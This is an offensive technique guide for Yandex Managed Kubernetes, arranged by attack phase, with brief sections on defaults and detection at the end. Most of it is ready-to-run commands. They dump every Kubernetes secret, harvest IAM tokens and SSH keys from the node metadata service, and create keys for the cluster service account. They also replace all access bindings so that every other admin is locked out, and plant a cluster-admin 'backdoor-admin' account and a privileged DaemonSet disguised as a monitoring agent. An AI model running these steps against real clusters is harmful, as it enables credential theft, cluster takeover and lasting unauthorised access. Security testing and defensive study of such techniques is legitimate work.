# Yandex Cloud - Managed Kubernetes Techniques

## Service Overview

Yandex Managed Service for Kubernetes provides fully managed Kubernetes clusters. The master is managed by Yandex Cloud (no direct SSH access). Worker nodes are Compute VMs organized in node groups. Authentication flows through Yandex Cloud IAM, which maps to Kubernetes RBAC. Two distinct service account layers exist: Yandex Cloud IAM service accounts (infrastructure management) and Kubernetes service accounts (pod-level API access).

**Key Concepts:**
- **Master**: Fully managed, either single-zone (base) or multi-zone (HA). Runs K8s API server, scheduler, controllers
- **Node Groups**: Sets of Compute VMs running as worker nodes, managed as instance groups
- **Dual Auth Model**: Yandex Cloud IAM roles + Kubernetes RBAC roles are both required
- **Two Service Accounts at Creation**: Cluster SA (manages infrastructure) and Node Group SA (pulls container images)
- **Release Channels**: `rapid`, `regular`, `stable` — set at creation, cannot be changed
- **Container Runtime**: containerd only (Docker not supported)

---

## Enumeration

### Enumerate Clusters

```bash
# List all clusters in the current folder
yc managed-kubernetes cluster list

# Get detailed cluster info (endpoints, SA IDs, KMS key, IP ranges)
yc managed-kubernetes cluster get <cluster_name_or_id>
yc managed-kubernetes cluster get <cluster_name_or_id> --format json

# Extract master endpoints
yc managed-kubernetes cluster get <cluster_id> --format json | \
  jq -r '.master.endpoints.external_v4_endpoint'

yc managed-kubernetes cluster get <cluster_id> --format json | \
  jq -r '.master.endpoints.internal_v4_endpoint'

# Extract cluster CA certificate
yc managed-kubernetes cluster get <cluster_id> --format json | \
  jq -r '.master.master_auth.cluster_ca_certificate'

# List cluster operations (audit trail of changes)
yc managed-kubernetes cluster list-operations <cluster>
```

### Enumerate Access Bindings

```bash
# List IAM access bindings on a cluster (shows who has what K8s API roles)
yc managed-kubernetes cluster list-access-bindings <cluster>

# Check for overprivileged k8s.cluster-api.cluster-admin assignments
yc managed-kubernetes cluster list-access-bindings <cluster> --format json | \
  jq '.[] | select(.role_id == "k8s.cluster-api.cluster-admin")'
```

### Enumerate Node Groups

```bash
# List all node groups in the folder
yc managed-kubernetes node-group list

# List node groups for a specific cluster
yc managed-kubernetes cluster list-node-groups <cluster>

# Get node group details (shows instance group ID, metadata, scaling config)
yc managed-kubernetes node-group get <node_group_name_or_id>

# List individual nodes with their IPs
yc managed-kubernetes cluster list-nodes <cluster>
yc managed-kubernetes node-group list-nodes --name <node_group_name>

# Get VM instance IPs from the underlying instance group
yc compute instance-group list-instances <instance_group_id>
```

### Enumerate via kubectl

After obtaining credentials, enumerate from the Kubernetes side:

```bash
# Get cluster credentials (writes to ~/.kube/config)
yc managed-kubernetes cluster get-credentials <cluster> --external  # public endpoint
yc managed-kubernetes cluster get-credentials <cluster> --internal  # internal endpoint (same VPC)

# Standard K8s enumeration
kubectl get nodes -o wide
kubectl get namespaces
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get serviceaccounts --all-namespaces
kubectl get clusterrolebindings
kubectl get rolebindings --all-namespaces
kubectl auth can-i --list
```

### Enumerate Available Versions

```bash
yc managed-kubernetes list-versions
```

---

## Credential Access

### Steal Kubeconfig

The `yc` CLI writes kubeconfig to `~/.kube/config`. It uses exec-based credential provider (calls `yc` for each request). If a static kubeconfig was created with an embedded token, stealing this file provides direct K8s API access.

```bash
# Common kubeconfig locations
# ~/.kube/config
# $KUBECONFIG environment variable
# CI/CD pipeline artifacts

# Check for static token-based kubeconfig (embedded tokens)
grep -l "token:" ~/.kube/config
```

### Extract Static ServiceAccount Tokens

In K8s >= 1.24, tokens must be explicitly created as secrets. These long-lived tokens are high-value targets:

```bash
# Find ServiceAccount token secrets
kubectl get secrets --all-namespaces -o json | \
  jq '.items[] | select(.type == "kubernetes.io/service-account-token") | {namespace: .metadata.namespace, name: .metadata.name}'

# Extract a token
kubectl -n kube-system get secret <token_secret_name> -o json | \
  jq -r '.data.token' | base64 -d
```

### Extract Secrets from etcd (Unencrypted by Default)

**By default, K8s secrets are stored unencrypted in etcd.** KMS encryption is opt-in and must be set at cluster creation time. If you have access to etcd data (e.g., through disk snapshots), secrets are readable in plaintext.

### Steal Workload Identity Tokens

If Workload Identity Federation is configured, pods receive projected short-lived JWT tokens:

```bash
# Default projected token path inside pods
cat /var/run/secrets/tokens/sa-token

# This JWT can be exchanged for Yandex Cloud IAM tokens
```

### Steal SA Keys from Kubernetes Secrets

Authorized keys for IAM service accounts are often stored as K8s secrets for integrations like External Secrets Operator:

```bash
# Find secrets that might contain SA keys
kubectl get secrets --all-namespaces -o json | \
  jq '.items[] | select(.data | to_entries[] | .value | @base64d | contains("PLEASE DO NOT REMOVE THIS LINE")) | {namespace: .metadata.namespace, name: .metadata.name}'
```

### Harvest Node Metadata SSH Keys

SSH keys are stored in node instance metadata:

```bash
# From a pod on a node, query the metadata service
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/attributes/ssh-keys"
```

---

## Privilege Escalation

### Cluster Service Account Abuse

The cluster SA has the `k8s.clusters.agent` role, which grants broad permissions: manage nodes, subnets, disks, load balancers, and K8s secrets. Compromising this SA provides infrastructure-level access.

```bash
# Identify the cluster SA
yc managed-kubernetes cluster get <cluster> --format json | jq -r '.service_account_id'

# If you can impersonate or create keys for this SA:
yc iam key create --service-account-id <cluster_sa_id> --output cluster-sa-key.json
```

### Node Group SA to Container Registry

The node group SA has `container-registry.images.puller`, which is shared across ALL pods on that node group. Any pod can pull any image accessible to this SA.

```bash
# Identify the node group SA
yc managed-kubernetes cluster get <cluster> --format json | jq -r '.node_service_account_id'
```

### Escalate via K8s RBAC

If you have `k8s.cluster-api.editor` (maps to K8s `edit` ClusterRole), you can create pods with service accounts that have higher privileges:

```bash
# Create a pod using a privileged service account
kubectl run escalate --image=ubuntu --overrides='{
  "spec": {"serviceAccountName": "admin-sa", "containers": [{"name": "escalate", "image": "ubuntu", "command": ["sleep", "infinity"]}]}
}'
```

### Exploit set-access-bindings (Destructive Replace)

The `set-access-bindings` operation **replaces ALL existing role bindings**. With `k8s.admin`, an attacker can remove all other admins and grant themselves `cluster-admin`:

```bash
# WARNING: This deletes all existing bindings
yc managed-kubernetes cluster set-access-bindings <cluster> \
  --access-binding role=k8s.cluster-api.cluster-admin,subject=userAccount:<attacker_id>
```

### Pod-to-Cloud Escalation via Metadata Service

Pods running on nodes with linked service accounts can access the metadata service to get IAM tokens:

```bash
# From inside a pod
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

### Workload Identity Federation Abuse

If you control a K8s ServiceAccount that's linked to a powerful IAM SA via Workload Identity Federation:

```bash
# Get the projected token from inside the pod
TOKEN=$(cat /var/run/secrets/tokens/sa-token)

# Exchange for Yandex Cloud IAM token
curl -X POST "https://auth.api.cloud.yandex.net/oauth/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "subject_token=$TOKEN" \
  -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt"
```

---

## Lateral Movement

### Pivot from Pod to Node

If a pod is compromised and has host-level access (privileged container, hostPID, hostNetwork):

```bash
# From a privileged pod, access host filesystem
ls /host/etc/
cat /host/root/.kube/config

# Access node metadata
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

### Pivot Between Clusters via Shared SAs

If multiple clusters share the same node group SA or cluster SA, compromising one cluster's SA provides access to resources of the other.

### IP Masquerading — Pod Traffic as Node Traffic

Pod-to-external traffic is masqueraded to the node IP via `ip-masq-agent`. This means from a network perspective, pod traffic appears to originate from the node. Useful for bypassing IP-based access controls.

### SSH to Nodes

```bash
# If OS Login is enabled
yc compute ssh --name <node_name>

# If SSH keys are in metadata
ssh <username>@<node_external_ip>
```

---

## Persistence

### Create Static Kubeconfig with cluster-admin Token

```bash
# Create a ServiceAccount with cluster-admin
kubectl create serviceaccount backdoor-admin -n kube-system
kubectl create clusterrolebinding backdoor-admin --clusterrole=cluster-admin --serviceaccount=kube-system:backdoor-admin

# Create a long-lived token secret (K8s >= 1.24)
kubectl apply -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: backdoor-admin-token
  namespace: kube-system
  annotations:
    kubernetes.io/service-account.name: backdoor-admin
type: kubernetes.io/service-account-token
EOF

# Extract token
kubectl -n kube-system get secret backdoor-admin-token -o jsonpath='{.data.token}' | base64 -d
```

### Deploy Backdoor DaemonSet

A DaemonSet runs on every node and survives node replacement:

```bash
kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: monitoring-agent
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: monitoring-agent
  template:
    metadata:
      labels:
        app: monitoring-agent
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: agent
        image: <attacker_image>
        securityContext:
          privileged: true
EOF
```

### Persist via Workload Identity Federation

Create a federation trusting an external OIDC provider you control, linked to a high-privilege IAM SA:

```bash
# The K8s cluster itself becomes the OIDC provider
# Subject format: system:serviceaccount:<namespace>:<sa_name>
yc iam workload-identity federated-credential create \
  --federation-id <wlif_id> \
  --service-account-id <powerful_sa_id> \
  --external-subject-id "system:serviceaccount:default:backdoor-sa"
```

### Create Keys for Cluster/Node SA

```bash
# Create authorized key for the cluster SA (unlimited lifetime)
yc iam key create --service-account-id <cluster_sa_id> --output cluster-key.json

# Create authorized key for the node SA
yc iam key create --service-account-id <node_sa_id> --output node-key.json
```

---

## Post-Exploitation

### Dump All Secrets

```bash
# Dump all K8s secrets
kubectl get secrets --all-namespaces -o json

# Decode specific secrets
kubectl get secret <name> -n <namespace> -o jsonpath='{.data}' | \
  jq 'to_entries[] | {key: .key, value: (.value | @base64d)}'
```

### Access Lockbox Secrets via ESO

If External Secrets Operator is installed, enumerate what Lockbox secrets are being synced:

```bash
# List ExternalSecrets
kubectl get externalsecrets --all-namespaces

# List SecretStores (contains SA key references)
kubectl get secretstores --all-namespaces -o yaml
kubectl get clustersecretstores -o yaml
```

### Enumerate Network Policies (or Lack Thereof)

```bash
# Check if network policies exist (if none, all pod-to-pod traffic is allowed)
kubectl get networkpolicies --all-namespaces

# Check which network policy controller is enabled (Calico or Cilium)
# Neither can be enabled post-creation - if none exists, no enforcement is possible
kubectl get pods -n kube-system | grep -E 'calico|cilium'
```

### Extract KMS Key References

```bash
# From cluster config
yc managed-kubernetes cluster get <cluster> --format json | jq '.kms_provider'

# From StorageClass definitions
kubectl get storageclasses -o yaml | grep kmsKeyId
```

---

## Security-Relevant Defaults

| Setting | Default | Risk |
|---|---|---|
| K8s Secrets encryption | **Unencrypted** in etcd | Secrets readable from disk/snapshots |
| Network policies | **Disabled** (no controller) | All pod-to-pod traffic allowed |
| Master public endpoint | Configurable at creation (immutable) | External API exposure |
| NodePort security group | Examples show `0.0.0.0/0` | Services exposed to internet |
| Release channel | Cannot change after creation | Locked into update cadence |
| `set-access-bindings` | **Replaces** all bindings | Destructive operation risk |
| Node SA image pull | Shared across all pods on node group | No per-pod image authorization |

---

## Key IAM Roles

| Role | What it Enables |
|---|---|
| `k8s.viewer` | View cluster/node group info |
| `k8s.editor` | Create/modify/delete clusters and node groups |
| `k8s.admin` | Full admin + assign roles on clusters |
| `k8s.clusters.agent` | Cluster SA role: manage nodes, subnets, disks, LBs, secrets |
| `k8s.tunnelClusters.agent` | Required for Cilium tunnel mode clusters |
| `k8s.cluster-api.viewer` | K8s `view` ClusterRole |
| `k8s.cluster-api.editor` | K8s `edit` ClusterRole |
| `k8s.cluster-api.cluster-admin` | K8s `cluster-admin` ClusterRole |
| `container-registry.images.puller` | Pull images from Yandex Container Registry |
| `kms.keys.encrypterDecrypter` | Required for KMS secret encryption |

---

## Detection and Logging

### K8s Audit Policy (Predefined, Non-Customizable)

- Write operations (create/update/delete): logged at **RequestResponse** level
- Read operations (get/list/watch): logged at **Request** level
- Secrets, ConfigMaps, SA tokens: **Metadata only** (no request/response body)
- Health checks (`/healthz`, `/version`): **Not logged**
- Events: **Not logged**
- Cluster-autoscaler configmap/endpoint operations: **Not logged**

### Enable Audit Logging

```bash
yc managed-kubernetes cluster create \
  --master-logging enabled=true,\
    log-group-id=<id>,\
    kube-apiserver-enabled=true,\
    cluster-autoscaler-enabled=true,\
    events-enabled=true,\
    audit-enabled=true
```

### Key Events to Monitor

- `CreateClusterRoleBinding` — new privileged RBAC bindings
- `CreateSecret` in `kube-system` — potential backdoor tokens
- `CreateDaemonSet` — persistence mechanism
- `GetSecret` at high frequency — credential harvesting
- Cluster `set-access-bindings` — mass role replacement
- New `ServiceAccount` creation in system namespaces

---

## References

- Managed Kubernetes Documentation: `en/managed-kubernetes/`
- Security Concepts: `en/managed-kubernetes/security/index.md`
- Network Concepts: `en/managed-kubernetes/concepts/network.md`
- Audit Policy: `en/managed-kubernetes/concepts/audit-policy.md`
- Workload Identity Tutorial: `en/_tutorials/security/wlif-managed-k8s-integration.md`
